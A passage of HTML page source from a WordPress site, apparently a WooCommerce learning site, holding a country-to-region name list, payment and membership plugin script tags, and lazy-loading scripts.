on","TR62":"Tunceli","TR63":"&#350;anl&#305;urfa","TR64":"U&#351;ak","TR65":"Van","TR66":"Yozgat","TR67":"Zonguldak","TR68":"Aksaray","TR69":"Bayburt","TR70":"Karaman","TR71":"K&#305;r&#305;kkale","TR72":"Batman","TR73":"&#350;&#305;rnak","TR74":"Bart&#305;n","TR75":"Ardahan","TR76":"I&#287;d&#305;r","TR77":"Yalova","TR78":"Karab&#252;k","TR79":"Kilis","TR80":"Osmaniye","TR81":"D&#252;zce"},"BR":{"AC":"Acre","AL":"Alagoas","AP":"Amap&aacute;","AM":"Amazonas","BA":"Bahia","CE":"Cear&aacute;","DF":"Distrito Federal","ES":"Esp&iacute;rito Santo","GO":"Goi&aacute;s","MA":"Maranh&atilde;o","MT":"Mato Grosso","MS":"Mato Grosso do Sul","MG":"Minas Gerais","PA":"Par&aacute;","PB":"Para&iacute;ba","PR":"Paran&aacute;","PE":"Pernambuco","PI":"Piau&iacute;","RJ":"Rio de Janeiro","RN":"Rio Grande do Norte","RS":"Rio Grande do Sul","RO":"Rond&ocirc;nia","RR":"Roraima","SC":"Santa Catarina","SP":"S&atilde;o Paulo","SE":"Sergipe","TO":"Tocantins"},"JP":{"JP01":"Hokkaido","JP02":"Aomori","JP03":"Iwate","JP04":"Miyagi","JP05":"Akita","JP06":"Yamagata","JP07":"Fukushima","JP08":"Ibaraki","JP09":"Tochigi","JP10":"Gunma","JP11":"Saitama","JP12":"Chiba","JP13":"Tokyo","JP14":"Kanagawa","JP15":"Niigata","JP16":"Toyama","JP17":"Ishikawa","JP18":"Fukui","JP19":"Yamanashi","JP20":"Nagano","JP21":"Gifu","JP22":"Shizuoka","JP23":"Aichi","JP24":"Mie","JP25":"Shiga","JP26":"Kyoto","JP27":"Osaka","JP28":"Hyogo","JP29":"Nara","JP30":"Wakayama","JP31":"Tottori","JP32":"Shimane","JP33":"Okayama","JP34":"Hiroshima","JP35":"Yamaguchi","JP36":"Tokushima","JP37":"Kagawa","JP38":"Ehime","JP39":"Kochi","JP40":"Fukuoka","JP41":"Saga","JP42":"Nagasaki","JP43":"Kumamoto","JP44":"Oita","JP45":"Miyazaki","JP46":"Kagoshima","JP47":"Okinawa"},"CA":{"AB":"Alberta","BC":"British Columbia","MB":"Manitoba","NB":"New Brunswick","NL":"Newfoundland and Labrador","NT":"Northwest Territories","NS":"Nova Scotia","NU":"Nunavut","ON":"Ontario","PE":"Prince Edward Island","QC":"Quebec","SK":"Saskatchewan","YT":"Yukon Territory"},"HU":{"BK":"B\u00e1cs-Kiskun","BE":"B\u00e9k\u00e9s","BA":"Baranya","BZ":"Borsod-Aba\u00faj-Zempl\u00e9n","BU":"Budapest","CS":"Csongr\u00e1d","FE":"Fej\u00e9r","GS":"Gy\u0151r-Moson-Sopron","HB":"Hajd\u00fa-Bihar","HE":"Heves","JN":"J\u00e1sz-Nagykun-Szolnok","KE":"Kom\u00e1rom-Esztergom","NO":"N\u00f3gr\u00e1d","PE":"Pest","SO":"Somogy","SZ":"Szabolcs-Szatm\u00e1r-Bereg","TO":"Tolna","VA":"Vas","VE":"Veszpr\u00e9m","ZA":"Zala"},"IE":{"CW":"Carlow","CN":"Cavan","CE":"Clare","CO":"Cork","DL":"Donegal","D":"Dublin","G":"Galway","KY":"Kerry","KE":"Kildare","KK":"Kilkenny","LS":"Laois","LM":"Leitrim","LK":"Limerick","LD":"Longford","LH":"Louth","MO":"Mayo","MH":"Meath","MN":"Monaghan","OY":"Offaly","RN":"Roscommon","SO":"Sligo","TA":"Tipperary","WD":"Waterford","WH":"Westmeath","WX":"Wexford","WW":"Wicklow"},"MX":{"Distrito Federal":"Distrito Federal","Jalisco":"Jalisco","Nuevo Leon":"Nuevo Le\u00f3n","Aguascalientes":"Aguascalientes","Baja California":"Baja California","Baja California Sur":"Baja California Sur","Campeche":"Campeche","Chiapas":"Chiapas","Chihuahua":"Chihuahua","Coahuila":"Coahuila","Colima":"Colima","Durango":"Durango","Guanajuato":"Guanajuato","Guerrero":"Guerrero","Hidalgo":"Hidalgo","Estado de Mexico":"Edo. de M\u00e9xico","Michoacan":"Michoac\u00e1n","Morelos":"Morelos","Nayarit":"Nayarit","Oaxaca":"Oaxaca","Puebla":"Puebla","Queretaro":"Quer\u00e9taro","Quintana Roo":"Quintana Roo","San Luis Potosi":"San Luis Potos\u00ed","Sinaloa":"Sinaloa","Sonora":"Sonora","Tabasco":"Tabasco","Tamaulipas":"Tamaulipas","Tlaxcala":"Tlaxcala","Veracruz":"Veracruz","Yucatan":"Yucat\u00e1n","Zacatecas":"Zacatecas"},"AR":{"C":"Ciudad Aut&oacute;noma de Buenos Aires","B":"Buenos Aires","K":"Catamarca","H":"Chaco","U":"Chubut","X":"C&oacute;rdoba","W":"Corrientes","E":"Entre R&iacute;os","P":"Formosa","Y":"Jujuy","L":"La Pampa","F":"La Rioja","M":"Mendoza","N":"Misiones","Q":"Neuqu&eacute;n","R":"R&iacute;o Negro","A":"Salta","J":"San Juan","D":"San Luis","Z":"Santa Cruz","S":"Santa Fe","G":"Santiago del Estero","V":"Tierra del Fuego","T":"Tucum&aacute;n"},"AU":{"ACT":"Australian Capital Territory","NSW":"New South Wales","NT":"Northern Territory","QLD":"Queensland","SA":"South Australia","TAS":"Tasmania","VIC":"Victoria","WA":"Western Australia"},"IR":{"KHZ":"Khuzestan  (\u062e\u0648\u0632\u0633\u062a\u0627\u0646)","THR":"Tehran  (\u062a\u0647\u0631\u0627\u0646)","ILM":"Ilaam (\u0627\u06cc\u0644\u0627\u0645)","BHR":"Bushehr (\u0628\u0648\u0634\u0647\u0631)","ADL":"Ardabil (\u0627\u0631\u062f\u0628\u06cc\u0644)","ESF":"Isfahan (\u0627\u0635\u0641\u0647\u0627\u0646)","YZD":"Yazd (\u06cc\u0632\u062f)","KRH":"Kermanshah (\u06a9\u0631\u0645\u0627\u0646\u0634\u0627\u0647)","KRN":"Kerman (\u06a9\u0631\u0645\u0627\u0646)","HDN":"Hamadan (\u0647\u0645\u062f\u0627\u0646)","GZN":"Ghazvin (\u0642\u0632\u0648\u06cc\u0646)","ZJN":"Zanjan (\u0632\u0646\u062c\u0627\u0646)","LRS":"Luristan (\u0644\u0631\u0633\u062a\u0627\u0646)","ABZ":"Alborz (\u0627\u0644\u0628\u0631\u0632)","EAZ":"East Azarbaijan (\u0622\u0630\u0631\u0628\u0627\u06cc\u062c\u0627\u0646 \u0634\u0631\u0642\u06cc)","WAZ":"West Azarbaijan (\u0622\u0630\u0631\u0628\u0627\u06cc\u062c\u0627\u0646 \u063a\u0631\u0628\u06cc)","CHB":"Chaharmahal and Bakhtiari (\u0686\u0647\u0627\u0631\u0645\u062d\u0627\u0644 \u0648 \u0628\u062e\u062a\u06cc\u0627\u0631\u06cc)","SKH":"South Khorasan (\u062e\u0631\u0627\u0633\u0627\u0646 \u062c\u0646\u0648\u0628\u06cc)","RKH":"Razavi Khorasan (\u062e\u0631\u0627\u0633\u0627\u0646 \u0631\u0636\u0648\u06cc)","NKH":"North Khorasan (\u062e\u0631\u0627\u0633\u0627\u0646 \u062c\u0646\u0648\u0628\u06cc)","SMN":"Semnan (\u0633\u0645\u0646\u0627\u0646)","FRS":"Fars (\u0641\u0627\u0631\u0633)","QHM":"Qom (\u0642\u0645)","KRD":"Kurdistan \/ \u06a9\u0631\u062f\u0633\u062a\u0627\u0646)","KBD":"Kohgiluyeh and BoyerAhmad (\u06a9\u0647\u06af\u06cc\u0644\u0648\u06cc\u06cc\u0647 \u0648 \u0628\u0648\u06cc\u0631\u0627\u062d\u0645\u062f)","GLS":"Golestan (\u06af\u0644\u0633\u062a\u0627\u0646)","GIL":"Gilan (\u06af\u06cc\u0644\u0627\u0646)","MZN":"Mazandaran (\u0645\u0627\u0632\u0646\u062f\u0631\u0627\u0646)","MKZ":"Markazi (\u0645\u0631\u06a9\u0632\u06cc)","HRZ":"Hormozgan (\u0647\u0631\u0645\u0632\u06af\u0627\u0646)","SBN":"Sistan and Baluchestan (\u0633\u06cc\u0633\u062a\u0627\u0646 \u0648 \u0628\u0644\u0648\u0686\u0633\u062a\u0627\u0646)"},"TH":{"TH-37":"Amnat Charoen (&#3629;&#3635;&#3609;&#3634;&#3592;&#3648;&#3592;&#3619;&#3636;&#3597;)","TH-15":"Ang Thong (&#3629;&#3656;&#3634;&#3591;&#3607;&#3629;&#3591;)","TH-14":"Ayutthaya (&#3614;&#3619;&#3632;&#3609;&#3588;&#3619;&#3624;&#3619;&#3637;&#3629;&#3618;&#3640;&#3608;&#3618;&#3634;)","TH-10":"Bangkok (&#3585;&#3619;&#3640;&#3591;&#3648;&#3607;&#3614;&#3617;&#3627;&#3634;&#3609;&#3588;&#3619;)","TH-38":"Bueng Kan (&#3610;&#3638;&#3591;&#3585;&#3634;&#3628;)","TH-31":"Buri Ram (&#3610;&#3640;&#3619;&#3637;&#3619;&#3633;&#3617;&#3618;&#3660;)","TH-24":"Chachoengsao (&#3593;&#3632;&#3648;&#3594;&#3636;&#3591;&#3648;&#3607;&#3619;&#3634;)","TH-18":"Chai Nat (&#3594;&#3633;&#3618;&#3609;&#3634;&#3607;)","TH-36":"Chaiyaphum (&#3594;&#3633;&#3618;&#3616;&#3641;&#3617;&#3636;)","TH-22":"Chanthaburi (&#3592;&#3633;&#3609;&#3607;&#3610;&#3640;&#3619;&#3637;)","TH-50":"Chiang Mai (&#3648;&#3594;&#3637;&#3618;&#3591;&#3651;&#3627;&#3617;&#3656;)","TH-57":"Chiang Rai (&#3648;&#3594;&#3637;&#3618;&#3591;&#3619;&#3634;&#3618;)","TH-20":"Chonburi (&#3594;&#3621;&#3610;&#3640;&#3619;&#3637;)","TH-86":"Chumphon (&#3594;&#3640;&#3617;&#3614;&#3619;)","TH-46":"Kalasin (&#3585;&#3634;&#3628;&#3626;&#3636;&#3609;&#3608;&#3640;&#3660;)","TH-62":"Kamphaeng Phet (&#3585;&#3635;&#3649;&#3614;&#3591;&#3648;&#3614;&#3594;&#3619;)","TH-71":"Kanchanaburi (&#3585;&#3634;&#3597;&#3592;&#3609;&#3610;&#3640;&#3619;&#3637;)","TH-40":"Khon Kaen (&#3586;&#3629;&#3609;&#3649;&#3585;&#3656;&#3609;)","TH-81":"Krabi (&#3585;&#3619;&#3632;&#3610;&#3637;&#3656;)","TH-52":"Lampang (&#3621;&#3635;&#3611;&#3634;&#3591;)","TH-51":"Lamphun (&#3621;&#3635;&#3614;&#3641;&#3609;)","TH-42":"Loei (&#3648;&#3621;&#3618;)","TH-16":"Lopburi (&#3621;&#3614;&#3610;&#3640;&#3619;&#3637;)","TH-58":"Mae Hong Son (&#3649;&#3617;&#3656;&#3630;&#3656;&#3629;&#3591;&#3626;&#3629;&#3609;)","TH-44":"Maha Sarakham (&#3617;&#3627;&#3634;&#3626;&#3634;&#3619;&#3588;&#3634;&#3617;)","TH-49":"Mukdahan (&#3617;&#3640;&#3585;&#3604;&#3634;&#3627;&#3634;&#3619;)","TH-26":"Nakhon Nayok (&#3609;&#3588;&#3619;&#3609;&#3634;&#3618;&#3585;)","TH-73":"Nakhon Pathom (&#3609;&#3588;&#3619;&#3611;&#3600;&#3617;)","TH-48":"Nakhon Phanom (&#3609;&#3588;&#3619;&#3614;&#3609;&#3617;)","TH-30":"Nakhon Ratchasima (&#3609;&#3588;&#3619;&#3619;&#3634;&#3594;&#3626;&#3637;&#3617;&#3634;)","TH-60":"Nakhon Sawan (&#3609;&#3588;&#3619;&#3626;&#3623;&#3619;&#3619;&#3588;&#3660;)","TH-80":"Nakhon Si Thammarat (&#3609;&#3588;&#3619;&#3624;&#3619;&#3637;&#3608;&#3619;&#3619;&#3617;&#3619;&#3634;&#3594;)","TH-55":"Nan (&#3609;&#3656;&#3634;&#3609;)","TH-96":"Narathiwat (&#3609;&#3619;&#3634;&#3608;&#3636;&#3623;&#3634;&#3626;)","TH-39":"Nong Bua Lam Phu (&#3627;&#3609;&#3629;&#3591;&#3610;&#3633;&#3623;&#3621;&#3635;&#3616;&#3641;)","TH-43":"Nong Khai (&#3627;&#3609;&#3629;&#3591;&#3588;&#3634;&#3618;)","TH-12":"Nonthaburi (&#3609;&#3609;&#3607;&#3610;&#3640;&#3619;&#3637;)","TH-13":"Pathum Thani (&#3611;&#3607;&#3640;&#3617;&#3608;&#3634;&#3609;&#3637;)","TH-94":"Pattani (&#3611;&#3633;&#3605;&#3605;&#3634;&#3609;&#3637;)","TH-82":"Phang Nga (&#3614;&#3633;&#3591;&#3591;&#3634;)","TH-93":"Phatthalung (&#3614;&#3633;&#3607;&#3621;&#3640;&#3591;)","TH-56":"Phayao (&#3614;&#3632;&#3648;&#3618;&#3634;)","TH-67":"Phetchabun (&#3648;&#3614;&#3594;&#3619;&#3610;&#3641;&#3619;&#3603;&#3660;)","TH-76":"Phetchaburi (&#3648;&#3614;&#3594;&#3619;&#3610;&#3640;&#3619;&#3637;)","TH-66":"Phichit (&#3614;&#3636;&#3592;&#3636;&#3605;&#3619;)","TH-65":"Phitsanulok (&#3614;&#3636;&#3625;&#3603;&#3640;&#3650;&#3621;&#3585;)","TH-54":"Phrae (&#3649;&#3614;&#3619;&#3656;)","TH-83":"Phuket (&#3616;&#3641;&#3648;&#3585;&#3655;&#3605;)","TH-25":"Prachin Buri (&#3611;&#3619;&#3634;&#3592;&#3637;&#3609;&#3610;&#3640;&#3619;&#3637;)","TH-77":"Prachuap Khiri Khan (&#3611;&#3619;&#3632;&#3592;&#3623;&#3610;&#3588;&#3637;&#3619;&#3637;&#3586;&#3633;&#3609;&#3608;&#3660;)","TH-85":"Ranong (&#3619;&#3632;&#3609;&#3629;&#3591;)","TH-70":"Ratchaburi (&#3619;&#3634;&#3594;&#3610;&#3640;&#3619;&#3637;)","TH-21":"Rayong (&#3619;&#3632;&#3618;&#3629;&#3591;)","TH-45":"Roi Et (&#3619;&#3657;&#3629;&#3618;&#3648;&#3629;&#3655;&#3604;)","TH-27":"Sa Kaeo (&#3626;&#3619;&#3632;&#3649;&#3585;&#3657;&#3623;)","TH-47":"Sakon Nakhon (&#3626;&#3585;&#3621;&#3609;&#3588;&#3619;)","TH-11":"Samut Prakan (&#3626;&#3617;&#3640;&#3607;&#3619;&#3611;&#3619;&#3634;&#3585;&#3634;&#3619;)","TH-74":"Samut Sakhon (&#3626;&#3617;&#3640;&#3607;&#3619;&#3626;&#3634;&#3588;&#3619;)","TH-75":"Samut Songkhram (&#3626;&#3617;&#3640;&#3607;&#3619;&#3626;&#3591;&#3588;&#3619;&#3634;&#3617;)","TH-19":"Saraburi (&#3626;&#3619;&#3632;&#3610;&#3640;&#3619;&#3637;)","TH-91":"Satun (&#3626;&#3605;&#3641;&#3621;)","TH-17":"Sing Buri (&#3626;&#3636;&#3591;&#3627;&#3660;&#3610;&#3640;&#3619;&#3637;)","TH-33":"Sisaket (&#3624;&#3619;&#3637;&#3626;&#3632;&#3648;&#3585;&#3625;)","TH-90":"Songkhla (&#3626;&#3591;&#3586;&#3621;&#3634;)","TH-64":"Sukhothai (&#3626;&#3640;&#3650;&#3586;&#3607;&#3633;&#3618;)","TH-72":"Suphan Buri (&#3626;&#3640;&#3614;&#3619;&#3619;&#3603;&#3610;&#3640;&#3619;&#3637;)","TH-84":"Surat Thani (&#3626;&#3640;&#3619;&#3634;&#3625;&#3598;&#3619;&#3660;&#3608;&#3634;&#3609;&#3637;)","TH-32":"Surin (&#3626;&#3640;&#3619;&#3636;&#3609;&#3607;&#3619;&#3660;)","TH-63":"Tak (&#3605;&#3634;&#3585;)","TH-92":"Trang (&#3605;&#3619;&#3633;&#3591;)","TH-23":"Trat (&#3605;&#3619;&#3634;&#3604;)","TH-34":"Ubon Ratchathani (&#3629;&#3640;&#3610;&#3621;&#3619;&#3634;&#3594;&#3608;&#3634;&#3609;&#3637;)","TH-41":"Udon Thani (&#3629;&#3640;&#3604;&#3619;&#3608;&#3634;&#3609;&#3637;)","TH-61":"Uthai Thani (&#3629;&#3640;&#3607;&#3633;&#3618;&#3608;&#3634;&#3609;&#3637;)","TH-53":"Uttaradit (&#3629;&#3640;&#3605;&#3619;&#3604;&#3636;&#3605;&#3606;&#3660;)","TH-95":"Yala (&#3618;&#3632;&#3621;&#3634;)","TH-35":"Yasothon (&#3618;&#3650;&#3626;&#3608;&#3619;)"},"ES":{"C":"A Coru&ntilde;a","VI":"Araba\/&Aacute;lava","AB":"Albacete","A":"Alicante","AL":"Almer&iacute;a","O":"Asturias","AV":"&Aacute;vila","BA":"Badajoz","PM":"Baleares","B":"Barcelona","BU":"Burgos","CC":"C&aacute;ceres","CA":"C&aacute;diz","S":"Cantabria","CS":"Castell&oacute;n","CE":"Ceuta","CR":"Ciudad Real","CO":"C&oacute;rdoba","CU":"Cuenca","GI":"Girona","GR":"Granada","GU":"Guadalajara","SS":"Gipuzkoa","H":"Huelva","HU":"Huesca","J":"Ja&eacute;n","LO":"La Rioja","GC":"Las Palmas","LE":"Le&oacute;n","L":"Lleida","LU":"Lugo","M":"Madrid","MA":"M&aacute;laga","ML":"Melilla","MU":"Murcia","NA":"Navarra","OR":"Ourense","P":"Palencia","PO":"Pontevedra","SA":"Salamanca","TF":"Santa Cruz de Tenerife","SG":"Segovia","SE":"Sevilla","SO":"Soria","T":"Tarragona","TE":"Teruel","TO":"Toledo","V":"Valencia","VA":"Valladolid","BI":"Bizkaia","ZA":"Zamora","Z":"Zaragoza"},"ZA":{"EC":"Eastern Cape","FS":"Free State","GP":"Gauteng","KZN":"KwaZulu-Natal","LP":"Limpopo","MP":"Mpumalanga","NC":"Northern Cape","NW":"North West","WC":"Western Cape"},"NP":{"ILL":"Illam","JHA":"Jhapa","PAN":"Panchthar","TAP":"Taplejung","BHO":"Bhojpur","DKA":"Dhankuta","MOR":"Morang","SUN":"Sunsari","SAN":"Sankhuwa","TER":"Terhathum","KHO":"Khotang","OKH":"Okhaldhunga","SAP":"Saptari","SIR":"Siraha","SOL":"Solukhumbu","UDA":"Udayapur","DHA":"Dhanusa","DLK":"Dolakha","MOH":"Mohottari","RAM":"Ramechha","SAR":"Sarlahi","SIN":"Sindhuli","BHA":"Bhaktapur","DHD":"Dhading","KTM":"Kathmandu","KAV":"Kavrepalanchowk","LAL":"Lalitpur","NUW":"Nuwakot","RAS":"Rasuwa","SPC":"Sindhupalchowk","BAR":"Bara","CHI":"Chitwan","MAK":"Makwanpur","PAR":"Parsa","RAU":"Rautahat","GOR":"Gorkha","KAS":"Kaski","LAM":"Lamjung","MAN":"Manang","SYN":"Syangja","TAN":"Tanahun","BAG":"Baglung","PBT":"Parbat","MUS":"Mustang","MYG":"Myagdi","AGR":"Agrghakanchi","GUL":"Gulmi","KAP":"Kapilbastu","NAW":"Nawalparasi","PAL":"Palpa","RUP":"Rupandehi","DAN":"Dang","PYU":"Pyuthan","ROL":"Rolpa","RUK":"Rukum","SAL":"Salyan","BAN":"Banke","BDA":"Bardiya","DAI":"Dailekh","JAJ":"Jajarkot","SUR":"Surkhet","DOL":"Dolpa","HUM":"Humla","JUM":"Jumla","KAL":"Kalikot","MUG":"Mugu","ACH":"Achham","BJH":"Bajhang","BJU":"Bajura","DOT":"Doti","KAI":"Kailali","BAI":"Baitadi","DAD":"Dadeldhura","DAR":"Darchula","KAN":"Kanchanpur"},"MY":{"JHR":"Johor","KDH":"Kedah","KTN":"Kelantan","MLK":"Melaka","NSN":"Negeri Sembilan","PHG":"Pahang","PRK":"Perak","PLS":"Perlis","PNG":"Pulau Pinang","SBH":"Sabah","SWK":"Sarawak","SGR":"Selangor","TRG":"Terengganu","KUL":"W.P. Kuala Lumpur","LBN":"W.P. Labuan","PJY":"W.P. Putrajaya"}};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/paid-member-subscriptions/assets/js/front-end.js?ver=2.15.9" id="pms-front-end-js"></script>
<script type="text/javascript" id="pms-stripe-script-js-extra">
/* <![CDATA[ */
var pms = {"ajax_url":"https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php","empty_credit_card_message":"Please enter a credit card number.","invalid_card_details_error":"Your card details do not seem to be valid.","pms_validate_currency_nonce":"0df30c5ee8","currency":"usd","pms_mc_addon_active":"","stripe_connected_account":"acct_1DP6SDIFPIKTzpR0","stripe_locale":"en","stripe_return_url":"https:\/\/learnwoo.com?pms_stripe_connect_return_url=1","stripe_account_country":"","pms_elements_appearance_api":{"theme":"stripe"},"pms_customer_session":""};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/paid-member-subscriptions/includes/gateways/stripe/assets/front-end-connect.js?ver=2.15.9" id="pms-stripe-script-js"></script>
<script type="text/javascript" id="pms-frontend-discount-code-js-js-extra">
/* <![CDATA[ */
var pms_discount_object = {"ajax_url":"https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/paid-member-subscriptions/includes/features/discount-codes/assets/js/frontend-discount-code.js?ver=2.15.9" id="pms-frontend-discount-code-js-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" defer data-rocket-src="https://learnwoo.com/wp-content/plugins/mailchimp-for-wp/assets/js/forms.js?ver=4.10.6" id="mc4wp-forms-api-js"></script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/paid-member-subscriptions/includes/gateways/paypal_connect/assets/sdk/paypal-js.js?ver=8.2.0" id="pms-paypal-js-js"></script>
<script type="text/javascript" id="pms-paypal-script-js-extra">
/* <![CDATA[ */
var pms_paypal = {"ajax_url":"https:\/\/learnwoo.com\/wp-admin\/admin-ajax.php","pms_ppcp_create_order_nonce":"18653a6aba","pms_ppcp_create_setup_token_nonce":"eb178f8cfd","pms_ppcp_generate_client_token_nonce":"2450602e28","pms_validate_currency_nonce":"0df30c5ee8","paypal_client_id":"AcYgXspx1qKT-nTxpC6Cm2xAdtpN53cWDtJ7hoOQWdIumtf2shebyBkmQCMLHXWbdlgpnVddmPMJ-tXq","paypal_merchant_id":"8EHMVY7ADGL8W","paypal_partner_attribution_id":"COZMOSLABSSRL_SP_PPCP","paypal_currency":"USD","pms_ppcp_mc_addon_active":"","paypal_integration_date":"2025-01-28","paypal_button_styles":{"layout":"vertical","color":"gold","shape":"rect","label":"pay","height":40}};
/* ]]> */
</script>
<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/paid-member-subscriptions/includes/gateways/paypal_connect/assets/pms-paypal-connect-front-end.js?ver=2.15.9" id="pms-paypal-script-js"></script>


<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdToTop.js?ver=12.7.1" id="tdToTop-js"></script>

<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdMenu.js?ver=12.7.1" id="tdMenu-js"></script>

<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdAjaxSearch.js?ver=12.7.1" id="tdAjaxSearch-js"></script>

<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdLoadingBox.js?ver=12.7.1" id="tdLoadingBox-js"></script>

<script type="rocketlazyloadscript" data-rocket-type="text/javascript" data-rocket-src="https://learnwoo.com/wp-content/plugins/td-composer/legacy/Newspaper/js/tdLogin.js?ver=12.7.1" id="tdLogin-js"></script>
<!-- JS generated by theme -->

<script type="rocketlazyloadscript" data-rocket-type="text/javascript" id="td-generated-footer-js">
    
</script>


<script type="rocketlazyloadscript">var td_res_context_registered_atts=["style_general_popular_categories"];</script>
<script>window.lazyLoadOptions=[{elements_selector:"img[data-lazy-src],.rocket-lazyload,iframe[data-lazy-src]",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,callback_loaded:function(element){if(element.tagName==="IFRAME"&&element.dataset.rocketLazyload=="fitvidscompatible"){if(element.classList.contains("lazyloaded")){if(typeof window.jQuery!="undefined"){if(jQuery.fn.fitVids){jQuery(element).parent().fitVids()}}}}}},{elements_selector:".rocket-lazyload",data_src:"lazy-src",data_srcset:"lazy-srcset",data_sizes:"lazy-sizes",class_loading:"lazyloading",class_loaded:"lazyloaded",threshold:300,}];window.addEventListener('LazyLoad::Initialized',function(e){var lazyLoadInstance=e.detail.instance;if(window.MutationObserver){var observer=new MutationObserver(function(mutations){var image_count=0;var iframe_count=0;var rocketlazy_count=0;mutations.forEach(function(mutation){for(var i=0;i<mutation.addedNodes.length;i++){if(typeof mutation.addedNodes[i].getElementsByTagName!=='function'){continue}
if(typeof mutation.addedNodes[i].getElementsByClassName!=='function'){continue}
images=mutation.addedNodes[i].getElementsByTagName('img');is_image=mutation.addedNodes[i].tagName=="IMG";iframes=mutation.addedNodes[i].getElementsByTagName('iframe');is_iframe=mutation.addedNodes[i].tagName=="IFRAME";rocket_lazy=mutation.addedNodes[i].getElementsByClassName('rocket-lazyload');image_count+=images.length;iframe_count+=iframes.length;rocketlazy_count+=rocket_lazy.length;if(is_image){image_count+=1}
if(is_iframe){iframe_count+=1}}});if(image_count>0||iframe_count>0||rocketlazy_count>0){lazyLoadInstance.update()}});var b=document.getElementsByTagName("body")[0];var config={childList:!0,subtree:!0};observer.observe(b,config)}},!1)</script><script data-no-minify="1" async src="https://learnwoo.com/wp-content/plugins/wp-rocket/assets/js/lazyload/17.8.3/lazyload.min.js"></script><script>function lazyLoadThumb(e,alt,l){var t='<img data-lazy-src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"><noscript><img src="https://i.ytimg.com/vi/ID/hqdefault.jpg" alt="" width="480" height="360"></noscript>',a='<button class="play" aria-label="Play Youtube video"></button>';if(l){t=t.replace('data-lazy-','');t=t.replace('loading="lazy"','');t=t.replace(/<noscript>.*?<\/noscript>/g,'');}t=t.replace('alt=""','alt="'+alt+'"');return t.replace("ID",e)+a}function lazyLoadYoutubeIframe(){var e=document.createElement("iframe"),t="ID?autoplay=1";t+=0===this.parentNode.dataset.query.length?"":"&"+this.parentNode.dataset.query;e.setAttribute("src",t.replace("ID",this.parentNode.dataset.src)),e.setAttribute("frameborder","0"),e.setAttribute("allowfullscreen","1"),e.setAttribute("allow","accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"),this.parentNode.parentNode.replaceChild(e,this.parentNode)}document.addEventListener("DOMContentLoaded",function(){var exclusions=[];var e,t,p,u,l,a=document.getElementsByClassName("rll-youtube-player");for(t=0;t<a.length;t++)(e=document.createElement("div")),(u='https://i.ytimg.com/vi/ID/hqdefault.jpg'),(u=u.replace('ID',a[t].dataset.id)),(l=exclusions.some(exclusion=>u.includes(exclusion))),e.setAttribute("data-id",a[t].dataset.id),e.setAttribute("data-query",a[t].dataset.query),e.setAttribute("data-src",a[t].dataset.src),(e.innerHTML=lazyLoadThumb(a[t].dataset.id,a[t].dataset.alt,l)),a[t].appendChild(e),(p=e.querySelector(".play")),(p.onclick=lazyLoadYoutubeIframe)});</script>
<script>(()=>{class RocketElementorPreload{constructor(){this.deviceMode=document.createElement("span"),this.deviceMode.id="elementor-device-mode-wpr",this.deviceMode.setAttribute("class","elementor-screen-only"),document.body.appendChild(this.deviceMode)}t(){let t=getComputedStyle(this.deviceMode,":after").content.replace(/"/g,"");this.animationSettingKeys=this.i(t),document.querySelectorAll(".elementor-invisible[data-settings]").forEach((t=>{const e=t.getBoundingClientRect();if(e.bottom>=0&&e.top<=window.innerHeight)try{this.o(t)}catch(t){}}))}o(t){const e=JSON.parse(t.dataset.settings),i=e.m||e.animation_delay||0,n=e[this.animationSettingKeys.find((t=>e[t]))];if("none"===n)return void t.classList.remove("elementor-invisible");t.classList.remove(n),this.currentAnimation&&t.classList.remove(this.currentAnimation),this.currentAnimation=n;let o=setTimeout((()=>{t.classList.remove("elementor-invisible"),t.classList.add("animated",n),this.l(t,e)}),i);window.addEventListener("rocket-startLoading",(function(){clearTimeout(o)}))}i(t="mobile"){const e=[""];switch(t){case"mobile":e.unshift("_mobile");case"tablet":e.unshift("_tablet");case"desktop":e.unshift("_desktop")}const i=[];return["animation","_animation"].forEach((t=>{e.forEach((e=>{i.push(t+e)}))})),i}l(t,e){this.i().forEach((t=>delete e[t])),t.dataset.settings=JSON.stringify(e)}static run(){const t=new RocketElementorPreload;requestAnimationFrame(t.t.bind(t))}}document.addEventListener("DOMContentLoaded",RocketElementorPreload.run)})();</script></body>
</html>

<!-- Page supported by LiteSpeed Cache 7.3.0.1 on 2025-09-08 10:41:19 -->
<!-- This website is like a Rocket, isn't it? Performance optimized by WP Rocket. Learn more: https://wp-rocket.me -->
